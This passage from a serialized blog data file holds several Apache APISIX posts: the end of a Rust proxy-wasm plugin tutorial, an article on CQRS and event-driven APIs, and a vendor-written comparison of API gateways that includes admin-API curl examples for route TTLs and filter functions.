Developers can create SDK for their tech stack\\n* Proxy and API Gateway providers can integrate `proxy-wasm` in their product\\n\\n## Apache APISIX and proxy-wasm\\n\\nThe Apache APISIX project decided to integrate `proxy-wasm` into the product to benefit from the standardization effort. It also allows end-users to start with Envoy, or any other `proxy-wasm`-compatible reverse proxy, to migrate to Apache APISIX when necessary.\\n\\nAPISIX doesn\'t implement `proxy-wasm` but integrates [wasm-nginx-module](https://github.com/api7/wasm-nginx-module). It\'s an Apache v2-licensed project provided by [api7.ai](https://api7.ai/), one of the main contributors to Apache APISIX. As its name implies, integration is done at the NGINX level.\\n\\n![Apache APISIX and WebAssemby architecture overview](https://static.apiseven.com/2022/09/30/architecture-diagram.svg)\\n\\n## Let\'s code!\\n\\nNow that we have explained how everything fits together, it\'s time to code.\\n\\n### Preparing Rust for WebAssembly\\n\\nBefore developing the first line of code, we need to give Rust <abbr title=\\"WebAssembly\\">WASM</abbr> compilation capabilities.\\n\\n```shell\\nrustup target add wasm32-wasi\\n```\\n\\nIt allows the Rust compiler to output WASM code:\\n\\n```bash\\ncargo build --target wasm32-wasi\\n```\\n\\nThe WASM code is found in:\\n\\n* `target/wasm32-wasi/debug/sample.wasm`\\n* `target/wasm32-wasi/release/sample.wasm` (when compiled with the `--release` flag)\\n\\n### Setting up the project\\n\\nThe setup of the project is pretty straightforward:\\n\\n```bash\\ncargo new sample --lib\\n```\\n\\nThe command creates a `lib` project with the expected structure.\\n\\n### The code itself\\n\\nLet me first say that the available documentation is pretty sparse. For example, `proxy-wasm`\'s is limited to the [methods\' signature](https://github.com/proxy-wasm/spec/tree/master/abi-versions/vNEXT) (think JavaDocs). Rust SDK is sample-based. However, one can get some information from the [C++ SDK](https://github.com/proxy-wasm/proxy-wasm-cpp-sdk/blob/master/docs/wasm_filter.md).\\n\\n> WASM module is running in a stack-based virtual machine and its memory is isolated from the host environment. All interactions between host and WASM module are through functions and callbacks wrapped by context object.\\n>\\n> At bootstrap time, a root context is created. The root context has the same lifetime as the VM/runtime instance and acts as a target for any interactions which happen at initial setup. It is also used for interactions that outlive a request.\\n>\\n> At request time, a context with incremental is created for each stream. Stream context has the same lifetime as the stream itself and acts as a target for interactions that are local to that stream.\\n\\nThe Rust code maps to the same abstractions.\\n\\n![Rust\'s \'structure diagram\'](https://static.apiseven.com/2022/09/30/struct-diagram.svg)\\n\\nHere\'s the code for a **very** simple plugin that logs to prove that it\'s invoked:\\n\\n```rust\\nuse log::warn;\\nuse proxy_wasm::traits::{Context, HttpContext};\\nuse proxy_wasm::types::{Action, LogLevel};\\n\\nproxy_wasm::main! {{\\n    proxy_wasm::set_log_level(LogLevel::Trace);                                          //1\\n    proxy_wasm::set_http_context(|_, _| -> Box<dyn HttpContext> { Box::new(HttpCall) }); //2\\n}}\\n\\nstruct HttpCall;\\n\\nimpl Context for HttpCall {}                                                             //3\\n\\nimpl HttpContext for HttpCall {                                                          //4\\n    fn on_http_request_headers(&mut self, _: usize, _: bool) -> Action {                 //5\\n        warn!(\\"on_http_request_headers\\");                                                //6\\n        Action::Continue\\n    }\\n}\\n```\\n\\n1. Set the log level to Apache APISIX\'s default\\n2. Set the HTTP context to create for _each_ request\\n3. Need to implement `Context`. By default, **all** functions are implemented in `Context`, so implementation is not mandatory\\n4. Likewise for `HttpContext`\\n5. Implement the function. Functions in `HttpContext` refer to a phase in the ABI lifecycle when headers are decoded. It should return an `Action`, whose value is either `Continue` or `Pause`.\\n6. Log - finally\\n\\nAfter generating the WebAssembly code (see above), we have to configure Apache APISIX.\\n\\n## Configuring Apache APISIX for WASM\\n\\nApache APISIX\'s [documentation](https://apisix.apache.org/docs/apisix/wasm/) is geared toward Go. Still, since both Go and Rust generate WebAssembly, we can reuse most of it.\\n\\nWe need to declare each WASM plugin:\\n\\n```yaml\\nwasm:\\n  plugins:\\n    - name: sample\\n      priority: 7999\\n      file: /opt/apisix/wasm/sample.wasm\\n```\\n\\nThen, we can use the plugin like any other:\\n\\n```yaml\\nroutes:\\n  - uri: /*\\n    upstream:\\n      type: roundrobin\\n      nodes:\\n        \\"httpbin.org:80\\": 1\\n    plugins:\\n      sample:                                #1\\n       conf: \\"dummy\\"                         #2\\n#END\\n```\\n\\n1. Plugin name\\n2. At the moment, the `conf` attribute is mandatory and must be non-empty on the Apache APISIX validation side, even though we don\'t configure anything on the Rust side\\n\\nAt this point, we can ping the endpoint:\\n\\n```bash\\ncurl localhost:9080\\n```\\n\\nThe result is as expected:\\n\\n```\\nrust-wasm-plugin-apisix-1  | 2022/09/21 13:43:14 [warn] 44#44: *286 on_http_request_headers, client: 192.168.128.1, server: _, request: \\"GET / HTTP/1.1\\", host: \\"localhost:9080\\"\\n```\\n\\n## Conclusion\\n\\nIn this post, I described the history behind the `proxy-wasm` and how Apache APISIX integrates it via the WASM Nginx module. I explained how to set up your Rust local environment to generate WebAssembly. Finally, I created a dummy plugin and deployed it to Apache APISIX.\\n\\nIn the next post, we\'ll beef up the plugin to provide valuable capabilities.\\n\\nThe source code is available on [GitHub](https://github.com/ajavageek/apisix-rust-plugin).\\n\\n**To go further:**\\n\\n* [proxy-wasm spec](https://github.com/proxy-wasm/spec)\\n* [WASM Nginx module](https://github.com/api7/wasm-nginx-module)\\n* [WebAssembly for Proxies (Rust SDK)](https://github.com/proxy-wasm/proxy-wasm-rust-sdk)\\n* [Apache APISIX WASM](https://apisix.apache.org/docs/apisix/wasm/)"},{"id":"Building event-driven API services using CQRS, API Gateway and Serverless","metadata":{"permalink":"/blog/2022/09/23/build-event-driven-api","source":"@site/blog/2022/09/23/build-event-driven-api.md","title":"Building event-driven API services using CQRS, API Gateway and Serverless","description":"This blog post explores how to build event-driven API Services using these 3 well-known patterns to build a highly scalable and distributed system.","date":"2022-09-23T00:00:00.000Z","formattedDate":"September 23, 2022","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":7.415,"truncated":true,"authors":[{"name":"Bobur Umurzokov","title":"Author","url":"https://github.com/Boburmirzo","image_url":"https://avatars.githubusercontent.com/u/14247607","imageURL":"https://avatars.githubusercontent.com/u/14247607"}],"prevItem":{"title":"Apache APISIX loves Rust!","permalink":"/blog/2022/09/28/rust-loves-apisix"},"nextItem":{"title":"Why Is Apache APISIX the Best API Gateway?","permalink":"/blog/2022/09/13/why-is-apache-apisix-the-best-api-gateway"}},"content":"> This blog post explores how to build event-driven API Services using these 3 well-known patterns to build a highly scalable and distributed system. We will break down each concept and understand the role of each in our particular approach.\\n\\n\x3c!--truncate--\x3e\\n\\n![Event Driven Api Services](https://static.apiseven.com/2022/09/24/632e047d6835c.jpg)\\n\\nDeveloping API services using [CQRS](https://learn.microsoft.com/en-us/azure/architecture/patterns/cqrs), [API Gateway](https://apisix.apache.org/docs/apisix/terminology/api-gateway/) and [Serverless](https://learn.microsoft.com/en-us/dotnet/architecture/serverless/serverless-architecture) combine three patterns, using the **command query responsibility separation** (_CQRS_) pattern, the **event sourcing pattern**, and the **API Gateway** pattern. The CQRS pattern separates the responsibilities of the command and query models. The event sourcing pattern takes advantage of asynchronous [event-driven](https://learn.microsoft.com/en-us/azure/architecture/guide/architecture-styles/event-driven) communication to improve the overall user experience. Furthermore, an API gateway should also be implemented as a resource router, thus preventing API consumers from having to deal with different URLs depending on the action being performed.\\n\\nAlthough the three concepts are independent, they complement each other well. This blog post explores how to build event-driven API Services using these **3 well-known patterns** to build a highly scalable and [distributed system](https://en.wikipedia.org/wiki/Distributed_computing). We will break down each concept and understand the role of each in our particular approach.\\n\\n## The event-driven architecture\\n\\nAn **event-driven architecture** makes use of events to trigger and communicate between decoupled services.  Each service publishes an event whenever it updates its data. Other services subscribe to events. When an event is received, a service updates its data.\\n\\nThis architecture has several benefits such as you completely **decoupling** producer and consumer services.  If one service has a failure, the rest will keep running. Consumers can respond to events immediately as they arrive. It adds **agility** as well. If you want to add another service, you can just have it subscribe to an event and have it generate new events of its own. The existing services don\u2019t know or care that this has happened, so there\u2019s no impact on them.\\n\\n![Event driven diagram](https://static.apiseven.com/2022/09/20/63289f6bb3090.png)\\n\\n## Why not use simply CRUD\\n\\nUsually, we use the same data model to query and update a database that is similar to the basic **CRUD** operations (**\u201cCREATE\u201d, \u201cREAD\u201d, \u201cUPDATE\u201d, and \u201cDELETE\u201d**) and it is the most straightforward way of dealing with data manipulation. We can build API services by following this simple principle. Any tool or framework that advertises itself as a quick method to bring your application to the market. But modern applications involve more complex business processes with workflows, validation, and business logic that are difficult to express using the classic CRUD paradigm.\\n\\nSome of the following challenges you can think of:\\n\\n- \u26d4\ufe0f Since for both read and write operations, and the same DTO or data transfer object are used, there\u2019s a chance that read and write operations will be out of sync.\\n\\n- \u26d4\ufe0f The application can perform a majority of reading queries (for example, searches) where your logic is not optimized for only read operations.\\n\\n- \u26d4\ufe0f As both read and write activities are permitted, security and permissions become more complicated to manage.\\n\\n- \u26d4\ufe0f Different data representations are required in order to address the multiple API consumer needs.\\n\\nAs a result of these difficulties, a new set of data manipulation patterns known as **CQRS** has arisen to enhance the classic CRUD methodology.\\n\\n## CQRS\\n\\n**CQRS** stands for _Command and Query Responsibility Segregation_, a pattern that separates reads and writes into different models, using commands to update data, and queries to read data.\\n\\n> This CQRS pattern, as it is known today, was first introduced by _Greg Young_ and was inspired by _Bertrand Meyer\'s_ command-query separation principle. Since its introduction, the pattern has gained a lot of popularity, and several resources can be found online describing its many flavors. This [link](https://cqrs.files.wordpress.com/2010/11/cqrs_documents.pdf) is a good source describing _Young\'s_ original thinking behind the pattern.\\n\\nThis pattern helps, as instead of having a standard service and storage supporting traditional CRUD operations, **query and upsert** (updates or creates) responsibilities are split (segregated) into different services, each with its own storage. Technically, this can be implemented in HTTP so that the **Command API** is implemented exclusively with POST routes (The write side uses a schema that is optimized for updates), while the **Query API** is implemented exclusively with GET routes (The read side can use a schema that is optimized for queries) as it is illustrated in the below diagram.\\n\\n![CQRS pattern example diagram](https://static.apiseven.com/2022/09/20/63289f6ad9d61.png)\\n\\nThis pattern is typically combined with yet another [**event sourcing pattern**](https://learn.microsoft.com/en-us/azure/architecture/patterns/event-sourcing), as it ensures that all changes made through Command API, are reflected in the read storage as well. The problem with the CQRS scenario, the read storage won\'t be immediately updated as part of one transaction (for example, as in the CRUD API service case because CRUD systems perform update operations directly against a data store). As a result, the query part will be not aware of the latest changes. Such a delay in storage reflecting the latest state of a resource is referred to as eventual consistency.  The event sourcing pattern is very useful because it enables different systems to consume resource state changes as a series of events in the log via an Event Hub capability as you can see in the below diagram.\\n\\n![Event sourcing with CQRS diagram](https://static.apiseven.com/2022/09/20/6328a7ca2abbc.png)\\n\\nThe diagram also shows the product\'s query operations performed against the read-only storage and the product\'s command operations persisted in an Event Hub capability. They are then picked up by another service called **Upsert service** responsible for upserting (create, update, and logical deletes) the read storage. Once an upsert action takes place, an event is generated that can be consumed by other services interested in any changes of state in product records.\\n\\n## API Gateway\\n\\n**Command and Query services APIs** can be managed via lightweight, independently deployable, and scalable **API gateways** that can run anywhere that allow developers to manage API endpoints. They can handle extremely large volumes, as they run on highly scalable platforms, for example, [Apache APISIX](https://apisix.apache.org/), [Kong](https://docs.konghq.com/), [Tyk](https://tyk.io/), and [Ambassador](https://www.getambassador.io/) to name a few.\\n\\nAPI Gateway can help with the challenges that you meet with implementing standard policies (for example, _authorization, throttling, and rate limiting_) for APIs. As an **API Gateway** acts as a central proxy to route all incoming requests from your clients to intended destinations (backend services).\\n\\nYou can utilize the API Gateway to expose a [REST API](https://en.wikipedia.org/wiki/Representational_state_transfer) in front of an event-driven integration. The below diagram illustrates the pattern first and foremost by showing how an API gateway implements resourcing routing to route read calls to the product\'s query service and upsert calls to the product\'s command service.\\n\\n![Building event-driven API services using CQRS, API Gateway and Serverless (2).png](https://static.apiseven.com/2022/09/20/6328a93c92d67.png)\\n\\n## Serverless event processing\\n\\nWe can create our consumer services by using **Serverless functions**. [Serverless](https://en.wikipedia.org/wiki/Serverless_computing) is a popular event-driven architectural style that is rapidly gaining traction when building and operating cloud-native applications. Serverless platforms can be categorized into two broad categories, Function as a _Service (FaaS)_ and _Backend as a Service (BaaS)_. The FaaS method allows customers to build, deploy, run, and manage their applications without managing the underlying infrastructure. When events arrive at the Event Hub, a new serverless (a piece of code or a function) is triggered to handle the event as it is shown in the next diagram.\\n\\n![Serverless, CQRS, Event sourcing and API Gateway](https://static.apiseven.com/2022/09/20/6328a7ca42d26.png)\\n\\nThere are many FaaS providers in the market and each platform has unique scenarios in which it shines. The largest cloud companies ([AWS](https://aws.amazon.com/), [Azure](https://azure.microsoft.com/en-us/), [Google](https://cloud.google.com/)) provide solutions ([AWS Lambda](https://aws.amazon.com/lambda/), [Azure Functions](https://learn.microsoft.com/en-us/azure/azure-functions/functions-overview), and [Google Cloud Function](https://cloud.google.com/functions) respectively) that are meant to fit nearly every situation with generic cloud products.\\n\\n## Conclusion\\n\\nThe blog post demonstrated shortly how to build event-driven API services by using some well-known patterns that is flexible to change and more easily decomposed.\\n\\nDespite some notable advantages the approach has, there are also some disadvantages as well. It increases the complexity of implementation, especially when compared with traditional CRUD services.\\n\\nSince our example is based on traditional REST APIs all use HTTP as the transport and protocol layer, the situation is much more complex when it comes to event-driven APIs. However, the same approach can also be applied to multiple different protocols (for example, [WebSockets](https://en.wikipedia.org/wiki/WebSocket), [MQTT](https://mqtt.org/), or [SSE](https://en.wikipedia.org/wiki/Server-sent_events)) depending on the capabilities offered by the API gateway chosen (_For example, [Apache APISIX](https://apisix.apache.org/) supports the proxy of [gRPC Web](https://apisix.apache.org/docs/apisix/plugins/grpc-web/) protocol by means of its plug-in_) how it handles conversions from one protocol to another.\\n\\n### Related resources\\n\\n\u2794 [What do you mean by \u201cEvent-Driven\u201d?](https://martinfowler.com/articles/201701-event-driven.html).\\n\\n\u2794 [Command Query Responsibility Segregation](https://docs.microsoft.com/en-us/azure/architecture/patterns/cqrs).\\n\\n\u2794 [Serverless architecture](https://learn.microsoft.com/en-us/dotnet/architecture/serverless/serverless-architecture).\\n\\n\u2794 [API Gateway](https://apisix.apache.org/docs/apisix/terminology/api-gateway/).\\n\\n### Recommended content\\n\\n\u2794 Watch Video Tutorial:\\n\\n- [Getting Started with Apache APISIX](https://youtu.be/dUOjJkb61so).\\n  \\n- [APIs security with Apache APISIX](https://youtu.be/hMFjhwLMtQ8).\\n\\n- [Implementing resilient applications with API Gateway (Circuit breaker)](https://youtu.be/aWzo0ysH__c).\\n\\n\u2794 Read the blog posts:\\n\\n- [Implementing resilient applications with API Gateway (Health Check)](https://dev.to/apisix/implementing-resilient-applications-with-api-gateway-health-check-338c).\\n\\n- [Overview of Apache APISIX API Gateway Plugins](https://dev.to/apisix/overview-of-apache-apisix-api-gateway-plugins-2m8o).\\n\\n### Community\u2935\ufe0f\\n\\n- \ud83d\ude4b [Join the Apache APISIX Community](https://apisix.apache.org/docs/general/join/)\\n- \ud83d\udc26 [Follow us on Twitter](https://twitter.com/ApacheAPISIX)\\n- \ud83d\udcdd [Find us on Slack](https://join.slack.com/t/the-asf/shared_invite/zt-vlfbf7ch-HkbNHiU_uDlcH_RvaHv9gQ)\\n- \ud83d\udce7 [Mail to us](dev@apisix.apache.org) with your questions."},{"id":"Why Is Apache APISIX the Best API Gateway?","metadata":{"permalink":"/blog/2022/09/13/why-is-apache-apisix-the-best-api-gateway","source":"@site/blog/2022/09/13/why-is-apache-apisix-the-best-api-gateway.md","title":"Why Is Apache APISIX the Best API Gateway?","description":"Why is Apache APISIX the best API Gateway? We will compare multiple API gateways (Kong, Tyk, Gloo) in terms of the popularity among developers, open source licenses, performances, and the ecosystem as a whole.","date":"2022-09-13T00:00:00.000Z","formattedDate":"September 13, 2022","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":12.415,"truncated":true,"authors":[{"name":"Ming Wen","title":"Author","url":"https://github.com/moonming","image_url":"https://avatars.githubusercontent.com/u/26448043","imageURL":"https://avatars.githubusercontent.com/u/26448043"}],"prevItem":{"title":"Building event-driven API services using CQRS, API Gateway and Serverless","permalink":"/blog/2022/09/23/build-event-driven-api"},"nextItem":{"title":"Hands-On: Set Up Ingress on Kubernetes With Apache APISIX Ingress Controller","permalink":"/blog/2022/09/09/kubernetes-ingress-with-apisix"}},"content":"> Why is Apache APISIX the best API Gateway? We will compare multiple API gateways (Kong, Tyk, Gloo) in terms of the popularity among developers, their open source licenses, their performances, and the ecosystem as a whole.\\n\\n\x3c!--truncate--\x3e\\n\\n<head>\\n  <link rel=\\"canonical\\" href=\\"https://api7.ai/blog/why-is-apache-apisix-the-best-api-gateway\\" />\\n</head>\\n\\n> This post was first published at [API7.ai](https://api7.ai/blog/why-is-apache-apisix-the-best-api-gateway/) by [Ming Wen](https://github.com/moonming).\\n\\nNowadays, mobile phones are used for all sorts of things, and various applications are available on the AppStore including social media, utility, games, lifestyle, online shopping, etc. Building these apps is inseparable from APIs. Therefore, companies that provide services through APIs must choose a reliable API gateway to ensure their services\u2019 speed, stability, and security.\\n\\nIn [CNCF\u2019s API Gateway landscape](https://landscape.cncf.io/card-mode?category=api-gateway&grouping=category&sort=contributors), there are nearly 20 types of API gateway (not including cloud vendor\u2019s services), including Apache APISIX, Kong, Tyk, etc. Many of them claim themselves to be the most popular open-source API gateway project, the next-generation API gateway, but are they?\\n\\nIn this article, we are going to analyze multiple API gateways in the dimensions of the popularity among developers, their open source licenses, their performances, and the ecosystem as a whole. In this analysis, we will see how Apache APISIX is the next-generation API Gateway, performing better than its peers in many aspects.\\n\\n![API Gateway landscape.png](https://static.apiseven.com/2022/09/13/632052e8c6f34.png)\\n\\n## Software Engineers Know It Well\\n\\nSoftware engineers are the users and developers of API and API gateway, so the popularity among engineers is a direct indicator of the trend. Below is a graph comparing the total number of GitHub contributors of four API gateways: Apache APISIX, Kong, Tky, and Gloo.\\n\\n![GitHub Contributors.png](https://static.apiseven.com/2022/09/13/632055a37ac26.png)\\n\\nWe can see from the graph that both Kong and Tyk started around 2015, while Apache APISIX and Gloo started later in 2019. More significantly, we can also see that the youngest Apache APISIX has the steepest curve among all of them and has accumulated more than 320 contributors, surpassing the second-best Kong by 57 people, becoming the API gateway project that has the most number of contributors.\\n\\n![Monthly Active Contributors.png](https://static.apiseven.com/2022/09/13/63205698e44f5.png)\\n\\nAside from the total number of contributors, the number of monthly active contributors indicates more significance. The monthly active contributors for Tyk have been only around 5 and rarely go above 10, while Kong and Gloo have been fluctuating between 10 and 20. In the meantime, Apache APISIX has monthly active contributors above 20 stably, and nearly 40 at the peak, making it the most active API gateway project.\\n\\nBehind the four open-source API gateway projects, there are four corresponding commercialized companies. So, another indicator that makes APISIX stand out is the ratio of the number of monthly active contributors versus the number of employees.\\n\\n|     **API Gateway**      | **APISIX** | **Kong** | **Tyk** | **Gloo** |\\n| :----------------------: | :--------: | :------: | :-----: | :------: |\\n|      monthly active      |     38     |    20    |    8    |    24    |\\n| employees(from Linkedln) |    40+     |   500+   |  200+   |   100+   |\\n\\nAs of 2022, Kong and Tyk have a ratio of 4%, and Gloo has a ratio of 24%. In contrast, APISIX almost reached 100%. The reason behind it is that since the very beginning when the company API7.ai started the APISIX project, it has been putting continuous effort into the open-source community and gained its reputation among developers.\\n\\n## Open Source Licence: The Most Important Factor of Choosing an Open Source API Gateway\\n\\nEver since MongoDB changed its open source license to SSPL (Server Side Public License) in 2018, enterprises now have to open source their own code when MongoDB is being used as a managed service. As a result, enterprises need to take into serious consideration of a project\u2019s open source license when choosing a project.\\n\\nFrom the surface, Apache APISIX, Kong, and Gloo all use the commercial-friendly Apache License Version 2.0, and Tyk uses Mozilla Public License Version 2.0. Dig deeper though, Kong, Gloo, and Tky are all backed by commercialized open source vendors. They can change their license any time just like MongoDB, limiting public cloud or other companies from using it freely, and forcing you to pay to access the new versions.\\n\\nNobody knows the probability of license changes. This risk, though, is just like the sword of Damocles, hanging above the users.\\n\\nUnder such circumstances, choosing an Apache Software Foundation(ASF)\'s open source project or a CNCF\u2019s open source project is the best choice, because they cannot modify the license of the project. Apache APISIX is such a project. It is an ASF top-level project, meaning no commercial company has absolute control of the Apache APISIX project, all codes belong to ASF and the license will not be changed. Enterprise users can use it freely without worrying about receiving inquiry emails from lawyers and compliance departments.\\n\\n## Performance of Apache APISIX, Kong and Gloo\\n\\nA frequently asked question in the community: which one has the better performance, Envoy-based Gloo or NGINX-based APISIX? Although performance is not the most critical metric, it is inarguably the most direct metric. The table below shows the benchmark scores of Apache APISIX and Gloo. The QPS of Apache APISIX is 4.6 times that of Gloo, and the latency of Apache APISIX is merely 7% of Gloo\u2019s.\\n\\n| **API Gateway** |                                Apache APISIX                                |                                 Gloo Edge                                 |\\n| :-------------: | :-------------------------------------------------------------------------: | :-----------------------------------------------------------------------: |\\n|     **QPS**     |                                    59122                                    |                                   12903                                   |\\n|   **Latency**   | 50.000% 470.00us<br/>75.000% 648.00us<br/>90.000% 0.89ms<br/>99.000% 1.60ms | 50.000% 6.80ms<br/>75.000% 9.25ms<br/>90.000% 11.32ms<br/>99.000% 17.06ms |\\n\\nThe choice of NGINX or Envoy is not the main factor of the performance difference, but the underlying optimization APISIX did in its source code. Even compared to KONG, which is also NGINX-based, APISIX has a huge performance upper hand. The graph below is extracted from [GigaOm\u2019s](https://gigaom.com/) report on testing Kong\u2019s Enterprise Edition and AP7 Enterprise Edition ([You can contact us for the complete data](https://api7.ai/request-demo/)).\\n\\n![Performance.png](https://static.apiseven.com/2022/09/13/6320574ba0244.png)\\n\\nThe latency of Kong is tens or even a hundred times of API7(Enterprise Edition created by authors of Apache APISIX)\u2019s.\\n\\nWhy does APISIX have such a big performance upper hand? There are no secrets in front of the code.\\n\\n## Talk Is Cheap, Show Me the Code\\n\\nNow, let us analyze Apache APISIX, Kong, and Gloo from a technical point of view. Apache APISIX\u2019s advantage mostly relies on optimization and innovation of the source code. The advantages of these technologies are not necessarily reflected in the simple PoC(Proof of Concept), but shown in a more complex production environment.\\n\\nBefore the emergence of the APISIX project, there were many commercial API gateways or open source API gateway products. These products stored API data, routing information, certificates, and configuration data in a relational database. The advantages of storing these data in relational databases are very obvious. Users can use SQL statements to perform flexible queries, and it is also convenient for users to perform backup and subsequent maintenance.\\n\\nHowever, the gateway is a middleware that handles all traffic from the client. The requirement for availability is extremely high. If the API gateway relies on a relational database, it means that once the relational database fails (such as downtime or data loss), the API gateway will also be affected, and the availability of the entire system will also be suffering.\\n\\nTo reduce the damage, APISIX structured its architecture to avoid the possibility of downtime and data loss. APISIX used etcd to store configuration data instead of a relational database, the advantages of doing so are as follows:\\n\\n1. It is more aligned with the cloud-native architecture\\n2. It is a better representation of the data type needed for the API gateway\\n3. It will have higher availability\\n4. The changes can be notified at a sub-millisecond level\\n\\nAfter using etcd to store configuration data, users only need to monitor etcd updates for data changes. APISIX will be able to obtain the latest configuration within milliseconds, achieving a real-time effect. If we were polling from the database, however, it may take 5-10 seconds to obtain the latest configuration information. Therefore, using etcd as the storage scheme not only makes APISIX more cloud-native but also higher availability.\\n\\n### High-Performance Route Matching Algorithm\\n\\nTo process a request, API Gateway needs to match the target expression with each request\'s host information, URI, HTTP methods, and other information. Thus, an efficient matching algorithm is crucial. The hash-based algorithm has good performance, but cannot achieve fuzzy matching. Regular expressions can perform fuzzy matching, but the performance is not so good. Apache APISIX\u2019s solution is to use a tree, an efficient search data structure that supports fuzzy matching. To be more precise, Apache APISIX uses a radix tree (compressed prefix tree), a data structure that only compresses intermediate nodes with one child. Among all the known API gateway products, Apache APISIX is the first to apply the radix tree in route matching and supports the scenario where one prefix can match multiple routes. For the implementation details, see [lua-resty-radixtree](https://github.com/api7/lua-resty-radixtree).\\n\\nWhen matching a request, the algorithm with the radix tree will match it progressively, with an O(K) complexity (K is the length of the URI in the route, and it is independent of the number of APIs). This algorithm suits very well in scenarios when there are a large number of routes, such as on public clouds or CDN. It also has no problem dealing with a large number of routes that increases rapidly.\\n\\n### High-Performance IP Matching Algorithm\\n\\nAn IP address has two notations: standard IP notation and CIDR notation, taking 32-bit IPv4 as an example:\\n\\n- Standard IP notation: 192.168.1.1\\n- CIDR notation: 192.168.1.1/8\\n\\nApache APISIX\'s IP matching and route matching use different algorithms. Take the IP of 192.168.1.1 as an example, since the range of each IP segment is 0 to 255, we can think that the IP address is composed of four 16-bit integer numbers, and the length of the IP is fixed. Thus, we can use a more efficient algorithm to complete the matching.\\n\\nAssume that there is an IP library containing 500 IPv4 records, APISIX will cache the 500 IPv4 records in the hash table, and use the hash table for IP matching. The time complexity is O(1). Other API gateways complete IP matching through list iteration and each request sent to the gateway may be iterated up to 500 times. Therefore, APISIX\'s high-precision IP matching algorithm greatly improves the efficiency of scenarios that require massive IP allowlist and denylist matching (such as WAF).\\n\\n### Routes Refinement\\n\\nAPI Gateways match the pre-defined rules with various information of the requests, such as the host information, URI, URI query parameters, URI path parameters, HTTP methods, request headers, etc. These pieces of information are supported by most of the API gateway. However, Apache APISIX supports more data in addition to these to solve more complex cases.\\n\\nFirst, Apache APISIX supports NGINX built-in variables, which means that we can use dozens of NGINX built-in variables as matching parameters, including `uri`, `server_name`, `server_addr`, `request_uri`, `remote_port`, `remote_addr`, `query_string`, `host`, `hostname`, `arg_name`.\\n\\nFor a list of NGINX built-in variables, [see NGINX Variables](http://nginx.org/en/docs/varindex.html).\\n\\nSecond, Apache APISIX supports conditional expressions as matching rules, and its structure is `[var, operator, val], ...]]`, where:\\n\\n- `var` values \u200b\u200bcan be NGINX built-in variables.\\n- `operator` supports equal, greater than, less than, regular expressions, contains, etc.\\n\\nAssuming the expression is `[\\"arg_name\\", \\"==\\", \\"json\\"]`, it means whether there is a parameter value of `name` equal to `json` in the URI query parameters of the current request. Apache APISIX implements this feature through its library `lua-resty-expr`. For details, please refer to [lua-resty-expr](https://github.com/api7/lua-resty-expr). This feature gives the user a lot of flexibility and is highly extensible.\\n\\nIn addition, Apache APISIX allows the users to set up routes\u2019 ttl(time to live).\\n\\n```shell\\n$ curl http://127.0.0.1:9080/apisix/admin/routes/2?ttl=60 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -i -d \'\\n{\\n    \\"uri\\": \\"/aa/index.html\\",\\n    \\"upstream\\": {\\n        \\"type\\": \\"roundrobin\\",\\n        \\"nodes\\": {\\n            \\"39.97.63.215:80\\": 1\\n        }\\n    }\\n}\'\\n```\\n\\nThe above code means that APISIX will automatically delete the routing configuration after 60sec, which will be required for some temporary verification scenarios, like canary release. It is also very convenient for online traffic splitting, a feature that other gateway products do not have.\\n\\nLastly, Apache APISIX supports customized filter functions, one can write custom Lua functions in the `filter_func` parameter, for example:\\n\\n```shell\\n$ curl http://127.0.0.1:9080/apisix/admin/routes/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -i -d \'\\n{\\n    \\"uri\\": \\"/index.html\\",\\n    \\"hosts\\": [\\"foo.com\\", \\"*.bar.com\\"],\\n    \\"filter_func\\": \\"function(vars)\\n                    return vars[\'host\'] == \'api7.ai\'\\n                end\\",\\n    \\"upstream\\": {\\n        \\"type\\": \\"roundrobin\\",\\n        \\"nodes\\": {\\n            \\"127.0.0.1:1980\\": 1\\n        }\\n    }\\n}\'\\n```\\n\\nThe input parameter of `filter_func` is `vars`, and NGINX variables can be obtained from `vars`, and then the filtering logic can be customized.\\n\\n### Support for Multi-Language Plugins\\n\\nUsers often need to customize some of the development and system integration of API gateway towards specific scenarios.\\n\\nAPISIX currently supports more than 80 plugins, but it is still difficult to cover all user scenarios. Thus, most companies will develop customized plugins for specific businesses, integrate more protocols and systems through the gateway, and achieve unified management at the gateway layer.\\n\\nIn earlier versions of APISIX, developers could only use Lua to develop plugins. Although plugins developed in native computing languages \u200b\u200bhave very high performance, learning Lua, a new development language, requires time and learning costs.\\n\\nIn response to this situation, APISIX provides two solutions.\\n\\nThe first solution is to support more mainstream programming languages \u200b\u200b(such as Java, Python, Go, etc.) through Plugin Runner. Using Plugin Runner, back-end engineers can communicate through local RPC to develop APISIX plugins using the programming languages they are familiar with. The advantage of this is to reduce development costs and improve development efficiency. The disadvantage will be performance losses. So, is there a way to achieve the near-native performance of Lua using high-level languages that developers are familiar with?\\n\\n![Multi-Language Architecture.png](https://static.apiseven.com/2022/09/13/632057a0ad122.png)\\n\\nThe second solution is to use Wasm to develop plugins, as shown in the left part of the above figure. Wasm (WebAssembly) was first used as a new type of technology that runs in browsers, but now it is also gradually showing its advantages on the server side. We embedded Wasm into APISIX, and users can use Wasm to compile Wasm bytecode to run in APISIX. To make use of Wasm we developed a Wasm plugin where users can develop near-native APISIX plugins using high-level programming languages.\\n\\nAs a result, users can use Lua, Go, Java, Python, Node.js, and Wasm to write custom plugins on APISIX. By making development easy, it opens doors for APISIX plugin development.\\n\\n## Conclusion\\n\\nIn this article, we analyzed and compared API gateway products from multiple perspectives such as software engineers, open source protocols, performance evaluation, technology, and ecosystem. We can see that Apache APISIX is superior in many aspects, a pioneer in the API network.\\n\\nApache APISIX is not only an API gateway that can handle north-south traffic, but also has open source products such as APISIX Ingress Controller and Service Mesh.\\n\\nIt also provides APISIX-based enterprise-level products and SaaS products.\\n\\n[Try Apache APISIX and API7 Enterprise products today!](https://api7.ai/request-demo/)"},{"id":"Hands-On: Set Up Ingress on Kubernetes With Apache APISIX Ingress Controller","metadata":{"permalink":"/blog/2022/09/09/kubernetes-ingress-with-apisix","source":"@site/blog/2022/09/09/kubernetes-ingress-with-apisix.md","title":"Hands-On: Set Up Ingress on Kubernetes With Apache APISIX Ingress Controller","description":"A tutorial on using Ingress in your Kubernetes cluster with Apache APISIX.","date":"2022-09-09T00:00:00.000Z","formattedDate":"September 9, 